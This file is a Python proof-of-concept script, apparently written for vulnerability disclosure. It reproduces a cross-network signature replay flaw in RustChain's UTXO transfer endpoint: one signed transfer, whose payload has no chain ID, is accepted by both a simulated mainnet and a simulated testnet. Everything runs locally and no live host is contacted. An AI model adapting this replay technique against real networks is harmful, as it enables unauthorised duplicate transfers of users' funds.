#!/usr/bin/env python3
"""Local PoC for RustChain UTXO cross-network signature replay.

The script creates two temporary isolated databases and Flask applications. It
signs one request once and submits the exact body to both simulated chains. No
live RustChain endpoint is contacted.
"""

from __future__ import annotations

import argparse
import hashlib
import importlib.util
import json
import sys
import tempfile
from pathlib import Path

from flask import Flask
from nacl.exceptions import BadSignatureError
from nacl.signing import SigningKey, VerifyKey


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--repo",
        type=Path,
        required=True,
        help="Path to a Scottcjn/Rustchain checkout",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    node_dir = (args.repo / "node").resolve()
    endpoints_path = node_dir / "utxo_endpoints.py"
    if not endpoints_path.is_file():
        raise SystemExit(f"utxo_endpoints.py not found under {node_dir}")

    sys.path.insert(0, str(node_dir))
    from utxo_db import (  # pylint: disable=import-error,import-outside-toplevel
        UNIT,
        UtxoDB,
        address_to_proposition,
        compute_box_id,
    )

    domain = "rustchain-utxo-transfer-v1"
    mainnet_chain_id = "rustchain-mainnet-v2"
    testnet_chain_id = "rustchain-testnet-v2"

    signing_key = SigningKey.generate()
    public_key_hex = signing_key.verify_key.encode().hex()

    def address_from_public_key(public_key: str) -> str:
        digest = hashlib.sha256(bytes.fromhex(public_key)).hexdigest()
        return "RTC" + digest[:40]

    from_address = address_from_public_key(public_key_hex)
    to_address = "RTC" + "b" * 40
    amount = 1.0
    fee = 0.0
    memo = "cross-network-replay-proof"
    nonce = 7

    signed_payload = {
        "domain": domain,
        "from": from_address,
        "to": to_address,
        "amount": amount,
        "fee": fee,
        "memo": memo,
        "nonce": nonce,
    }
    signed_message = json.dumps(
        signed_payload,
        sort_keys=True,
        separators=(",", ":"),
    ).encode()
    signature_hex = signing_key.sign(signed_message).signature.hex()

    request_body = {
        "from_address": from_address,
        "to_address": to_address,
        "amount_rtc": amount,
        "fee_rtc": fee,
        "public_key": public_key_hex,
        "signature": signature_hex,
        "nonce": nonce,
        "memo": memo,
    }

    def verify_signature(public_key: str, message: bytes, signature: str) -> bool:
        try:
            VerifyKey(bytes.fromhex(public_key)).verify(
                message,
                bytes.fromhex(signature),
            )
            return True
        except (BadSignatureError, ValueError):
            return False

    def load_endpoints(module_name: str):
        spec = importlib.util.spec_from_file_location(module_name, endpoints_path)
        module = importlib.util.module_from_spec(spec)
        assert spec.loader is not None
        spec.loader.exec_module(module)
        return module

    def seed_balance(database: UtxoDB, chain_id: str) -> None:
        value = 5 * UNIT
        transaction_id = hashlib.sha256(
            f"genesis:{chain_id}".encode()
        ).hexdigest()
        proposition = address_to_proposition(from_address)
        box_id = compute_box_id(value, proposition, 0, transaction_id, 0)
        database.add_box(
            {
                "box_id": box_id,
                "value_nrtc": value,
                "proposition": proposition,
                "owner_address": from_address,
                "creation_height": 0,
                "transaction_id": transaction_id,
                "output_index": 0,
                "tokens_json": "[]",
                "registers_json": "{}",
            }
        )

    def execute_on_chain(chain_id: str, slot: int, directory: Path) -> dict:
        database_path = str(directory / f"{chain_id}.db")
        database = UtxoDB(database_path)
        database.init_tables()
        seed_balance(database, chain_id)

        module = load_endpoints(f"utxo_endpoints_{slot}")
        app = Flask(f"rustchain-{slot}")
        module.register_utxo_blueprint(
            app,
            database,
            database_path,
            verify_signature,
            address_from_public_key,
            lambda: slot,
            dual_write=False,
        )
        response = app.test_client().post("/utxo/transfer", json=request_body)
        body = response.get_json(silent=True)
        return {
            "chain_id": chain_id,
            "slot": slot,
            "status_code": response.status_code,
            "accepted": bool(body and body.get("ok")),
            "sender_balance_nrtc": database.get_balance(from_address),
            "recipient_balance_nrtc": database.get_balance(to_address),
        }

    with tempfile.TemporaryDirectory() as temp_dir:
        directory = Path(temp_dir)
        mainnet = execute_on_chain(mainnet_chain_id, 101, directory)
        testnet = execute_on_chain(testnet_chain_id, 202, directory)

    assert "chain_id" not in signed_payload
    assert mainnet["status_code"] == 200 and mainnet["accepted"], mainnet
    assert testnet["status_code"] == 200 and testnet["accepted"], testnet
    assert mainnet["sender_balance_nrtc"] == 4 * UNIT, mainnet
    assert testnet["sender_balance_nrtc"] == 4 * UNIT, testnet
    assert mainnet["recipient_balance_nrtc"] == UNIT, mainnet
    assert testnet["recipient_balance_nrtc"] == UNIT, testnet

    report = {
        "signature_domain": domain,
        "signed_payload_contains_chain_id": False,
        "same_public_key": public_key_hex,
        "same_signature": signature_hex,
        "same_nonce": nonce,
        "mainnet": mainnet,
        "testnet": testnet,
        "classification": "cross_network_signature_replay",
        "reproduced": True,
    }
    print(json.dumps(report, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
